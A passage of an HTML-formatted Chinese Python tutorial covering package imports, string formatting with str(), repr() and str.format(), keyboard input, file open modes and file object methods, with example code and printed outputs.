class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>如果 <strong><strong>all</strong></strong> 没有定义，那么使用**from sound.effects import ***这种语法的时候，就不会导入包 sound.effects 里的任何子模块</p>\n</li>\n<li><p>包还提供一个额外的属性__path__。这是一个目录列表，里面每一个包含的目录都有为这个包服务的__init__.py</p>\n</li>\n</ol>\n<h2 id=\"输入输出\"><a href=\"#输入输出\" class=\"headerlink\" title=\"输入输出\"></a>输入输出</h2><h3 id=\"输入格式美化\"><a href=\"#输入格式美化\" class=\"headerlink\" title=\"输入格式美化\"></a>输入格式美化</h3><ol>\n<li><code>print()</code></li>\n<li><code>write()</code></li>\n<li><code>sys.stdout</code>标准输出文件</li>\n<li><code>str.format()</code>多样化</li>\n<li><code>str()</code>用户易读</li>\n<li><code>repr</code>解释器易读</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># test</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 'test'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">/</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 0.14285714285714285</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">/</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 0.14285714285714285</span>\ns <span class=\"token operator\">=</span> <span class=\"token string\">'test\\nhaha'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\ntest\nhaha\n'''</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\ntest\nhaha\n'''</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># repr将转义字符当做字符执行</span>\n<span class=\"token comment\"># 'test\\nhaha'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 注意括号</span>\n<span class=\"token comment\"># ('test\\nhaha', [1, 2])</span>\n<span class=\"token comment\"># repr接收python所有类型</span>\n\n<span class=\"token comment\"># 输出平方与立方表</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 注意前一行 'end' 的使用</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>x<span class=\"token operator\">*</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># rjust() 方法, 它可以将字符串靠右, 并在左边填充空格</span>\n<span class=\"token comment\"># zfill(), 它会在数字的左边填充 0</span>\n\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{0:2d} {1:3d} {2:4d}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> x<span class=\"token operator\">*</span>x<span class=\"token punctuation\">,</span> x<span class=\"token operator\">*</span>x<span class=\"token operator\">*</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\ntest\n'test'\n0.14285714285714285\n0.14285714285714285\ntest\nhaha\ntest\nhaha\n'test\\nhaha'\n('test\\nhaha', [1, 2])\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"str-format-基本使用\"><a href=\"#str-format-基本使用\" class=\"headerlink\" title=\"str.format()基本使用\"></a>str.format()基本使用</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 常规输出</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{}-{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'one'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'two'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># one-two</span>\n\n<span class=\"token comment\"># 索引输入</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{1}-{0}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'one'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'two'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># two-one</span>\n\n<span class=\"token comment\"># 关键字参数输出</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{name}-{age}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>age<span class=\"token operator\">=</span><span class=\"token string\">'one'</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'two'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># two-one</span>\n\n<span class=\"token comment\"># 结合</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{1}-{0}-{test}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> test<span class=\"token operator\">=</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2-1-3</span>\n\n<span class=\"token keyword\">import</span> math\n<span class=\"token comment\"># !a (使用 ascii()), !s (使用 str()) 和 !r (使用 repr())</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{!a}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 3.141592653589793</span>\n\n<span class=\"token comment\"># :后面.加数字代表保留几位小数，和类型</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{0:.3f}。'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>pi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 3.142。</span>\n\n<span class=\"token comment\"># :后面加整数，表示证该域至少有这么多的宽度</span>\ntable <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">for</span> name<span class=\"token punctuation\">,</span> number <span class=\"token keyword\">in</span> table<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{0:10} ==&gt; {1:10d}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\nGoogle     ==&gt;          1\nRunoob     ==&gt;          2\nTaobao     ==&gt;          3\n'''</span>\n\n<span class=\"token comment\"># 传入一个字典, 然后使用方括号 [] 来访问键值</span>\ntable <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Runoob: {0[Runoob]:d}; Google: {0[Google]:d}; Taobao: {0[Taobao]:d}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Runoob: 2; Google: 1; Taobao: 3</span>\n\n<span class=\"token comment\"># 通过在 table 变量前使用 ** 来实现相同的功能</span>\ntable <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Runoob: {Runoob:d}; Google: {Google:d}; Taobao: {Taobao:d}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Runoob: 2; Google: 1; Taobao: 3</span>\n\n<span class=\"token triple-quoted-string string\">'''\none-two\ntwo-one\ntwo-one\n2-1-3\n3.141592653589793\n3.142。\nGoogle     ==&gt;          1\nRunoob     ==&gt;          2\nTaobao     ==&gt;          3\nRunoob: 2; Google: 1; Taobao: 3\nRunoob: 2; Google: 1; Taobao: 3\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"旧式字符串格式化\"><a href=\"#旧式字符串格式化\" class=\"headerlink\" title=\"旧式字符串格式化\"></a>旧式字符串格式化</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%5.3f'</span> <span class=\"token operator\">%</span> math<span class=\"token punctuation\">.</span>pi<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 3.142</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"读取键盘输入\"><a href=\"#读取键盘输入\" class=\"headerlink\" title=\"读取键盘输入\"></a>读取键盘输入</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">strstr <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入：\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你输入的内容是: \"</span><span class=\"token punctuation\">,</span> strstr<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>strstr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 传入的值都为str</span>\n\n<span class=\"token comment\"># 输入三角形的三边长</span>\na<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入三角形三边的长：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nb <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 计算三角形的半周长p</span>\np <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">+</span> b <span class=\"token operator\">+</span> c<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span>\n<span class=\"token comment\"># 计算三角形的面积s</span>\ns <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> a<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">**</span> <span class=\"token number\">0.5</span>\n<span class=\"token comment\"># 输出三角形的面积</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"三角形面积为：\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">'.2f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n请输入：9\n你输入的内容是:  9\n&lt;class 'str'&gt;\n请输入三角形三边的长：8 7 9\n三角形面积为： 26.83\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"读和写文件\"><a href=\"#读和写文件\" class=\"headerlink\" title=\"读和写文件\"></a>读和写文件</h3><p>open() 返回一个 file 对象</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>filename：包含了你要访问的文件名称的字符串值</li>\n<li>mode：决定了打开文件的模式：只读，写入，追加等，默认文件访问模式为只读(r)</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"left\">模式</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">r</td>\n<td align=\"left\">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>\n</tr>\n<tr>\n<td align=\"left\">rb</td>\n<td align=\"left\">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。</td>\n</tr>\n<tr>\n<td align=\"left\">r+</td>\n<td align=\"left\">打开一个文件用于读写。文件指针将会放在文件的开头。</td>\n</tr>\n<tr>\n<td align=\"left\">rb+</td>\n<td align=\"left\">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</td>\n</tr>\n<tr>\n<td align=\"left\">w</td>\n<td align=\"left\">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td align=\"left\">wb</td>\n<td align=\"left\">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td align=\"left\">w+</td>\n<td align=\"left\">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td align=\"left\">wb+</td>\n<td align=\"left\">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td align=\"left\">a</td>\n<td align=\"left\">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>\n</tr>\n<tr>\n<td align=\"left\">ab</td>\n<td align=\"left\">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>\n</tr>\n<tr>\n<td align=\"left\">a+</td>\n<td align=\"left\">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>\n</tr>\n<tr>\n<td align=\"left\">ab+</td>\n<td align=\"left\">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>\n</tr>\n</tbody></table>\n<h4 id=\"文件对象的方法\"><a href=\"#文件对象的方法\" class=\"headerlink\" title=\"文件对象的方法\"></a>文件对象的方法</h4><h5 id=\"f-read\"><a href=\"#f-read\" class=\"headerlink\" title=\"f.read()\"></a>f.read()</h5><p>f.read(size)将读取一定数目的数据, 然后作为字符串或字节对象返回，size 是一个可选的数字类型的参数，当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 打开一个文件</span>\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/foo.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 关闭打开的文件</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"f-readline\"><a href=\"#f-readline\" class=\"headerlink\" title=\"f.readline()\"></a>f.readline()</h5><p>f.readline() 会从文件中读取单独的一行，换行符为 ‘\\n’，f.readline() 如果返回一个空字符串, 说明已经已经读取到最后一行</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 打开一个文件</span>\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/foo.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 关闭打开的文件</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"f-readlines\"><a href=\"#f-readlines\" class=\"headerlink\" title=\"f.readlines()\"></a>f.readlines()</h5><p>f.readlines() 将返回该文件中包含的所有行，如果设置可选参数 sizehint, 则读取指定长度的字节, 并且将这些字节按行分割</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 打开一个文件</span>\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/foo.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 关闭打开的文件</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 打开一个文件</span>\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/foo.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 关闭打开的文件</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"f-write\"><a href=\"#f-write\" class=\"headerlink\" title=\"f.write()\"></a>f.write()</h5><p>f.write(string) 将 string 写入到文件中, 然后返回写入的字符数</p>\n<p>不是字符串的需要先转换</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 打开一个文件</span>\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/foo.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span>\n\nnum <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span> <span class=\"token string\">\"Python 是一个非常好的语言。\\n是的，的确非常好!!\\n\"</span> <span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 关闭打开的文件</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 29</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"f-tell\"><a href=\"#f-tell\" class=\"headerlink\" title=\"f.tell()\"></a>f.tell()</h5><p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数</p>\n<h5 id=\"f-seek\"><a href=\"#f-seek\" class=\"headerlink\" title=\"f.seek()\"></a>f.seek()</h5><ol>\n<li>f.seek(offset, from_what) 函数改变文件当前的位置</li>\n<li>from_what 的值， 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾</li>\n<li>from_what 值为默认为0，即文件开头</li>\n</ol>\n<ul>\n<li>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符</li>\n<li>seek(x,1) ： 表示从当前位置往后移动x个字符</li>\n<li>seek(-x,2)：表示从文件的结尾往前移动x个字符</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/foo.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb+'</span><span class=\"token punctuation\">)</span>\nf<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">b'0123456789abcdef'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 16</span>\nf<span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 移动到文件的第六个字节</span>\n<span class=\"token comment\"># 5</span>\nf<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># b'5'</span>\nf<span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 移动到文件的倒数第三字节</span>\n<span class=\"token comment\"># 13</span>\nf<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># b'd'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"f-close\"><a href=\"#f-close\" class=\"headerlink\" 